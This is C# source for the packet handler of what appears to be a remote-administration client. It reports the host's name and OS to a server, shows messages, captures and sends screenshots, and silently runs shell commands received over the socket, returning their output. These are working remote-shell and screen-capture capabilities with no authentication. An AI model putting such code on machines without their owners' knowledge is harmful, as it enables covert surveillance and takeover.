﻿using System;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Klijent.Networking.Packages;
using System.Windows.Forms;
using System.Drawing;
using ScreenShotDemo;
using System.IO;
using System.Diagnostics;

namespace Klijent.Networking
{
    //Statična klasa PacketHandler služi za identifikaciju i pokretanje radnji na primljene pakete
    static class PacketHandler
    {
        public static bool wasTheMessageEverReceived = false;
        public static MessageForm NewMessageForm = new MessageForm();
        //Paket koji se šalje pri konekciji sa serverom i sadrži osnovne informacije o klijentu
        public static byte[] SendClientInfoToServer()
        {
            string clientComputerName = Environment.MachineName;
            string clientOsVersion = Environment.OSVersion.ToString();
            ClientInfoPackage clientInfoPackage = new ClientInfoPackage(clientComputerName, clientOsVersion);
            return clientInfoPackage.ToByteArray();
        }

        //Metoda koja hendla (tj. identificira) pristigle paket
        public static void Handle(byte[] receivedPacket, Socket clientSocket)
        {
            //packetID je identifikator paketa i zauzima prva 4 byta            
            int packetId = BitConverter.ToInt32(receivedPacket, 0);
            //Console.WriteLine(packetId);
            switch (packetId)
            {
                case 1:
                    break;
                case 2:
                    TextMessagePacketHandler(receivedPacket, clientSocket);
                    break;
                case 3:
                    DisconnectPacketHandler(clientSocket);
                    break;
                case 4:
                    ScreenshotPacketHandler(clientSocket);
                    break;
                case 6:
                    ShellCommandPacketHandler(receivedPacket, clientSocket);
                    break;
            }
        }
        private static void TextMessagePacketHandler(byte[] receivedPacket, Socket clientSocket)        
        {
            try
            {
                if (wasTheMessageEverReceived == false)
                {
                    wasTheMessageEverReceived = true;
                    TextMessagePackage textMessagePackage = new TextMessagePackage(receivedPacket);
                    NewMessageForm.ReceiveMessage(textMessagePackage.textMessage);
                    NewMessageForm.ShowDialog();
                    NewMessageForm.Focus();
                }
                else
                {
                    TextMessagePackage textMessagePackage = new TextMessagePackage(receivedPacket);
                    //NewMessageForm.Activate();                           
                    NewMessageForm.ReceiveMessage(textMessagePackage.textMessage);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Ne mogu primiti poruku od Servera!");
            }
        }

        //Metoda kojom gasimo klijenta na zahtijev servera
        private static void DisconnectPacketHandler(Socket clientSocket)
        {
            clientSocket.Close();
            Application.Exit();
        }

        //Metoda kojom radimo screenshot i šaljemo ga serveru 
        private static void ScreenshotPacketHandler(Socket clientSocket)
        {
            ScreenCapture sc = new ScreenCapture();            
            Image img = sc.CaptureScreen();
            ScreenshotPackage screenShotPackage = new ScreenshotPackage(img);
            clientSocket.Send(screenShotPackage.ToByteArray());
        }

        private static void ShellCommandPacketHandler(byte[] receivedPacket, Socket clientSocket)
        {
            try
            {               
                ShellCommandPackage shellCommandPackage = new ShellCommandPackage(receivedPacket);
                string cmdFilePath = Application.StartupPath + "\\cmd.cmd";
                // Zapisujemo u fajl
                using (StreamWriter sw = File.CreateText(cmdFilePath))
                {
                    sw.WriteLine(shellCommandPackage.shellCommand);
                }

                string shellOutput = null;
                Process proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = cmdFilePath,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                while (!proc.StandardOutput.EndOfStream)
                {
                    shellOutput += proc.StandardOutput.ReadLine() + "\n";
                }
                ShellOutputPackage shellOutputPackage = new ShellOutputPackage(shellOutput);
                clientSocket.Send(shellOutputPackage.ToByteArray());
            }
            catch (Exception ex)
            {
            }
        }
    }
}
